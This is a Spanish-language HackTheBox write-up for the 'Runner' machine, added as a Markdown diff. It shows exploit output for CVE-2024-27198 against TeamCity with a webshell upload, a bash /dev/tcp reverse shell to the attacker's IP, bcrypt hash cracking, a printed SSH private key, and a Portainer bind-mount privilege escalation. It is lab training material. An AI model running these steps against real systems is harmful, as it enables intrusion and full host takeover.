@@ -1,0 +1,384 @@
+---
+title: "Máquina Runner"
+description: "Resolución de la máquina Runner de HackTheBox"
+tags: ["CVE-2024-27198", "Stored credentials", "Portainer"]
+categories: ["HackTheBox", "Medium", "Linux"]
+logo: "/assets/writeups/runner/logo.webp"
+---
+
+Un CI expuesto tiene una vulnerabilidad con la cual podremos crear un usuario administrador, de ahí podremos hacer prácticamente lo que sea con la web del CI como puede ser extraer todos los datos, entre esos datos encontraremos contraseñas y una llave privada RSA para acceder a la máquina. Luego escalaremos privilegios abusando de un Portainer interno.
+
+## Reconocimiento
+
+La máquina tiene 3 puertos abiertos
+
+```bash
+# Nmap 7.94 scan initiated Sat Apr 20 15:02:33 2024 as: nmap -sS -Pn -vvv -p- --open -oN ports --min-rate 200 -n 10.129.44.110
+Nmap scan report for 10.129.44.110
+Host is up, received user-set (0.14s latency).
+Scanned at 2024-04-20 15:02:33 -04 for 241s
+Not shown: 50273 closed tcp ports (reset), 15259 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE  REASON
+22/tcp   open  ssh      syn-ack ttl 63
+80/tcp   open  http     syn-ack ttl 63
+8000/tcp open  http-alt syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat Apr 20 15:06:34 2024 -- 1 IP address (1 host up) scanned in 241.07 seconds
+```
+
+La web en el 80 (`runner.htb`) nos muestra información:
+
+![Web](/assets/writeups/runner/1.png)
+
+En el puerto 8000 no parece haber nada interesante, por lo que podemos pasar a ver que hacemos con la información que tenemos.
+
+## Intrusión
+
+### tcuser - 172.17.0.x
+
+Si leemos lo que tenemos en el portal, podremos encontrar un dato curioso:
+
+![Wondering](/assets/writeups/runner/2.png)
+
+Parece que utilizan TeamCity para su CI/CD, si por querer curiosear intentamos ver si `teamcity.runner.htb` existe (no te olvides de agregarlo a tu archivo de hosts) nos encontramos con:
+
+![TeamCity](/assets/writeups/runner/3.png)
+
+Efectivamente están usando TeamCity, y parece ser una versión vieja vulnerable a un CVE que nos permite crear un usuario administrador y hacer cosas maliciosas... vaya.
+
+Podemos encontrar POCs de este CVE por ahí, yo utilizaré [este](https://github.com/W01fh4cker/CVE-2024-27198-RCE/) para proseguir. Con ejecutarlo y darle los parámetros que necesita ya tendremos RCE:
+
+```bash
+❯ python CVE-2024-27198-RCE.py -u uwuowo -p uwuowo123 -t http://teamcity.runner.htb/
+
+ _____                     ____ _ _           ____   ____ _____ 
+|_   _|__  __ _ _ __ ___  / ___(_) |_ _   _  |  _ \ / ___| ____|
+  | |/ _ \/ _` | '_ ` _ \| |   | | __| | | | | |_) | |   |  _|  
+  | |  __/ (_| | | | | | | |___| | |_| |_| | |  _ <| |___| |___ 
+  |_|\___|\__,_|_| |_| |_|\____|_|\__|\__, | |_| \_\\____|_____|
+                                      |___/                     
+                                                                            Author: @W01fh4cker
+                                                                            Github: https://github.com/W01fh4cker
+    
+[+] User added successfully, username: uwuowo, password: uwuowo123, user ID: 16
+[+] The target operating system version is linux
+[!] The current version is: 2023.05.3 (build 129390). The official has deleted the /app/rest/debug/processes port. You can only upload a malicious plugin to upload webshell and cause RCE.
+[!] The program will automatically upload the webshell ofbehinder3.0. You can also specify the file to be uploaded through the parameter -f. Do you wish to continue? (y/n)y 
+[+] The malicious plugin gYKBxES3 was successfully uploaded and is trying to be activated
+[+] Successfully load plugin gYKBxES3
+[+] The malicious plugin gYKBxES3 was successfully activated! Webshell url: http://teamcity.runner.htb/plugins/gYKBxES3/gYKBxES3.jsp
+[+] Please start executing commands freely! Type <quit> to end command execution
+command > whoami
+tcuser
+```
+
+Podemos ahora lanzarnos una reverse shell a nuestro equipo.
+
+```bash
+command > bash -c 'bash -i >& /dev/tcp/<your-ip>/443 0>&1'
+```
+
+```bash
+❯ nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.13 52636
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+   Welcome to TeamCity Server Docker container
+
+ * Installation directory: /opt/teamcity
+ * Logs directory:         /opt/teamcity/logs
+ * Data directory:         /data/teamcity_server/datadir
+
+   TeamCity will be running under 'tcuser' user (1000/1000)
+
+tcuser@647a82f29ca0:~/bin$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+   Welcome to TeamCity Server Docker container
+
+ * Installation directory: /opt/teamcity
+ * Logs directory:         /opt/teamcity/logs
+ * Data directory:         /data/teamcity_server/datadir
+
+   TeamCity will be running under 'tcuser' user (1000/1000)
+
+tcuser@647a82f29ca0:~/bin$ ^Z
+[1]  + 8975 suspended  nc -lvnp 443
+
+❯ stty raw -echo; fg
+[1]  + 8975 continued  nc -lvnp 443
+                                   reset xterm
+tcuser@647a82f29ca0:~/bin$ export TERM=xterm-256color
+tcuser@647a82f29ca0:~/bin$ stty rows 34 columns 149
+tcuser@647a82f29ca0:~/bin$ source /etc/skel/.bashrc
+```
+
+### john - runner.htb
+
+Podemos ver los archivos del TeamCity en cuestión:
+
+```bash
+tcuser@647a82f29ca0:~$ ls -la
+total 92
+drwxr-xr-x  1 tcuser tcuser  4096 Mar  6 17:36 .
+drwxr-xr-x  1 root   root    4096 Aug 24  2023 ..
+-rw-------  1 tcuser tcuser   127 Mar  6 17:36 .bash_history
+drwxr-xr-x  2 tcuser tcuser  4096 Aug 24  2023 bin
+-rw-r--r--  1 tcuser tcuser     0 Aug 23  2023 BUILD_129390
+drwxr-xr-x  1 tcuser tcuser  4096 Aug 24 00:58 conf
+drwxr-xr-x  5 tcuser tcuser  4096 Aug 24  2023 devPackage
+drwxr-xr-x  2 tcuser tcuser  4096 Aug 24  2023 lib
+drwxr-xr-x  2 tcuser tcuser  4096 Aug 24  2023 licenses
+drwxr-xr-x  3 tcuser tcuser  4096 Aug 24 13:12 logs
+-rw-r--r--  1 tcuser tcuser   146 Aug 24  2023 README.md
+-rw-r--r--  1 tcuser tcuser   343 Aug 23  2023 service.properties
+-rw-r--r--  1 tcuser tcuser   978 Aug 23  2023 TeamCity-readme.txt
+drwxr-xr-x 36 tcuser tcuser  4096 Aug 24 13:10 temp
+-rw-r--r--  1 tcuser tcuser 16982 Aug 23  2023 Tomcat-running.txt
+drwxr-xr-x  1 tcuser tcuser  4096 Aug 24  2023 webapps
+drwxr-x---  3 tcuser tcuser  4096 Feb 28 19:05 work
+```
+
+Buscando por este contenedor, podemos ver que hay un directorio `/data/teamcity_server/datadir`, que parece ser el directorio de datos de este CI:
+
+```bash
+tcuser@647a82f29ca0:/data/teamcity_server/datadir$ ls -al
+total 28
+drwxr-xr-x 7 tcuser tcuser 4096 Aug 24 01:08 .
+drwxr-xr-x 3 root   root   4096 Aug 24  2023 ..
+drwxr-x--- 2 tcuser tcuser 4096 Aug 24 09:57 backup
+drwxr-x--- 8 tcuser tcuser 4096 Aug 24 09:57 config
+drwxr-x--- 3 tcuser tcuser 4096 Feb 28 10:36 lib
+drwxr-x--- 3 tcuser tcuser 4096 Aug 24 13:10 plugins
+drwxr-x--- 6 tcuser tcuser 4096 Aug 24 03:00 system
+```
+
+Buscando en el directorio `config`, podemos ver que hay un archivo llamado `database.properties` con el siguiente contenido:
+
+```bash
+tcuser@647a82f29ca0:/data/teamcity_server/datadir/config$ cat database.properties 
+#Wed Feb 28 10:37:02 GMT 2024
+connectionUrl=jdbc\:hsqldb\:file\:$TEAMCITY_SYSTEM_PATH/buildserver
+```
+
+`$TEAMCITY_SYSTEM_PATH` es simplemente `/data/teamcity_server/datadir/system`; ahí podremos encontrar lo que parece ser la base de datos
+
+```bash
+tcuser@647a82f29ca0:/data/teamcity_server/datadir/system$ ls -al
+total 812
+drwxr-x---  6 tcuser tcuser   4096 Aug 24 03:00 .
+drwxr-xr-x  7 tcuser tcuser   4096 Aug 24 01:08 ..
+drwxr-x---  2 tcuser tcuser   4096 Feb 28 10:37 artifacts
+-rw-r-----  1 tcuser tcuser 245760 Aug 24 13:09 buildserver.data
+-rw-r-----  1 tcuser tcuser     16 Aug 24 13:29 buildserver.lck
+-rw-r-----  1 tcuser tcuser 503444 Aug 24 13:29 buildserver.log
+-rw-r-----  1 tcuser tcuser     85 Aug 24 03:00 buildserver.properties
+-rw-r-----  1 tcuser tcuser  49666 Aug 24 03:00 buildserver.script
+drwxr-x---  2 tcuser tcuser   4096 Aug 24 03:00 buildserver.tmp
+drwxr-x--- 24 tcuser tcuser   4096 Aug 24 13:10 caches
+-rw-r-----  1 tcuser tcuser    147 Aug 24 01:01 dataDirectoryInitialized
+drwxr-x--- 12 tcuser tcuser   4096 Feb 28 19:55 pluginData
+```
+
+Se ve que vamos a tener que parsear un poco ya que evidentemente, no está en formato de texto claro al ser una base de datos H2, sin embargo existe un directorio de backups vacio:
+
+```bash
+tcuser@647a82f29ca0:/data/teamcity_server/datadir/backup$ ls -al
+total 796
+drwxr-x--- 2 tcuser tcuser   4096 Aug 24 13:37 .
+drwxr-xr-x 7 tcuser tcuser   4096 Aug 24 01:08 ..
+```
+
+y el CI tiene una función para hacer backups, como se puede investigar en internet. Esto nos va a ahorrar trabajo ya que solamente tenemos que utilizar esta función para pasarnos todos los datos del TeamCity a nuestro equipo, dicha función se puede hallar en `Administration -> Backups`, y podemos personalizar que cosas queremos incluir en el backup:
+
+![Backup](/assets/writeups/runner/4.png)
+
+Haciendolo y luego descargándolo, podemos ver cosas interesantes al extraerlo:
+
+```bash
+❯ ls -la
+drwxr-xr-x vzon vzon 4.0 KB Sat Aug 24 09:44:24 2024 
+drwxr-xr-x vzon vzon 4.0 KB Sat Aug 24 09:44:20 2024 .
+.--------- vzon vzon   6 B  Sat Aug 24 13:43:16 2024 charset
+drwxr-xr-x vzon vzon 4.0 KB Sat Aug 24 09:44:24 2024 config
+drwxr-xr-x vzon vzon 4.0 KB Sat Aug 24 09:44:24 2024 database_dump
+.--------- vzon vzon 678 B  Sat Aug 24 13:43:16 2024 export.report
+drwxr-xr-x vzon vzon 4.0 KB Sat Aug 24 09:44:24 2024 metadata
+drwxr-xr-x vzon vzon 4.0 KB Sat Aug 24 09:44:24 2024 plugins
+drwxr-xr-x vzon vzon 4.0 KB Sat Aug 24 09:44:24 2024 system
+.rw-r--r-- vzon vzon 262 KB Sat Aug 24 09:43:33 2024 TeamCity_Backup_20240824_134317.zip
+.--------- vzon vzon  92 B  Sat Aug 24 13:43:16 2024 version.txt
+```
+
+Algunos archivos aparecen con los bits de permiso en 0, por lo que vamos a tener que establecerlos en 755 con `chmod`. Viendo cada archivo podemos encontrar los usuarios y sus respectivos hashes:
+
+```bash
+❯ cat users
+ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
+1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1724493260088, BCRYPT
+2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
+3, uwuowo, $2a$07$pr5tdkjI7hsUyjc3SPBZ6el.lPbgND2WeL75Yqf4Nj.D2ZY0P6lKW, , uwuowo@example.com, 1724506839542, BCRYPT
+```
+
+La contraseña de matthew es débil
+
+```bash
+❯ hashcat -m 3200 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --show
+$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em:piper123
+```
+
+Sin embargo, no nos sirve para acceder por SSH, pero lo verdaderamente curioso además de esta contraseña podemos encontrarlo en `config/projects/AllProjects/pluginData/ssh_keys`
+
+```bash
+❯ ls -la
+drwxr-xr-x vzon vzon 4.0 KB Sat Aug 24 09:44:24 2024 .
+drwxr-xr-x vzon vzon 4.0 KB Sat Aug 24 09:44:24 2024 ..
+.rwxr-xr-x vzon vzon 2.5 KB Wed Feb 28 19:56:44 2024 id_rsa
+```
+
+¡Es una llave RSA!
+
+```bash
+❯ cat id_rsa 
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Si decodificamos el base64 y vemos los bytes de esta llave, podemos encontrar un comentario que es `john@runner`, lo que seguramente es el usuario al que le pertenece esta llave. Autenticándonos por ssh con esta llave como `john` nos dará acceso al sistema:
+
+```bash
+❯ /usr/bin/ssh -i id_rsa john@runner.htb
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+  System information as of Sat Aug 24 01:51:40 PM UTC 2024
+
+  System load:                      0.18603515625
+  Usage of /:                       81.4% of 9.74GB
+  Memory usage:                     48%
+  Swap usage:                       3%
+  Processes:                        236
+  Users logged in:                  1
+  IPv4 address for br-21746deff6ac: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.11.13
+  IPv6 address for eth0:            dead:beef::250:56ff:feb0:f855
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Aug 24 12:06:59 2024 from 10.10.14.58
+john@runner:~$
+```
+
+En el directorio personal de este usuario ya podremos encontrar la primera flag.
+
+```bash
+john@runner:~$ ls -la
+total 32
+drwxr-x--- 4 john john 4096 Aug 24 10:35 .
+drwxr-xr-x 4 root root 4096 Apr  4 10:24 ..
+lrwxrwxrwx 1 root root    9 Feb 28 20:04 .bash_history -> /dev/null
+-rw-r--r-- 1 john john  220 Feb 28 18:51 .bash_logout
+-rw-r--r-- 1 john john 3771 Feb 28 18:51 .bashrc
+drwx------ 2 john john 4096 Apr  4 10:24 .cache
+-rw-r--r-- 1 john john  807 Feb 28 18:51 .profile
+drwx------ 2 john john 4096 Aug 24 10:40 .ssh
+-rw-r----- 1 root john   33 Aug 24 00:58 user.txt
+john@runner:~$ cat user.txt 
+46cb3408bab372d9a97d18f9ed******
+```
+
+## Escalada de privilegios
+
+Existe un subdominio que antes no habiamos visto:
+
+```bash
+john@runner:~$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 runner runner.htb teamcity.runner.htb portainer-administration.runner.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+Se trata de un Portainer, que es una interfaz web para manejar contenedores Docker con facilidad y sin mucho costo:
+
+![Portainer login](/assets/writeups/runner/5.png)
+
+Lo que inmediatamente se puede convertir en un vector para escalar privilegios.
+
+Las únicas credenciales que podemos probar son las de matthew que descubrimos con anterioridad, y para nuestra suerte se reutilizan:
+
+![Portainer](/assets/writeups/runner/6.png)
+
+Sabiendo que se trata de Docker, ahora lo que podemos hacer es simplemente crear un contenedor dentro del entorno `primary` y colocarle un volumen creado por nosotros que sea un bind hacia todo el disco del sistema host. Luego, al crear el contenedor y acceder a la consola de este ya tendremos acceso a todo el disco y por ende podremos tomar la última flag.
+
+> No pude colocar como tomaba la última flag ni como ajustaba el volumen ya que por alguna razón, el Portainer y el TeamCity dejaron de funcionar y ahora solo me tiran un error 502 a pesar de reiniciar la máquina varias veces. Para el volumen debes crearlo con el driver local, establecer las opciones `o` en `bind` y `device` en `/` y colocar el punto de montura donde desees.
+>
+> Luego editaré el writeup y colocaré las respectivas imagenes faltantes... si es que arreglan la máquina antes de que deje de estar disponible gratuitamente.
+{: .prompt-warning }
+
+
+
+
+
+
+
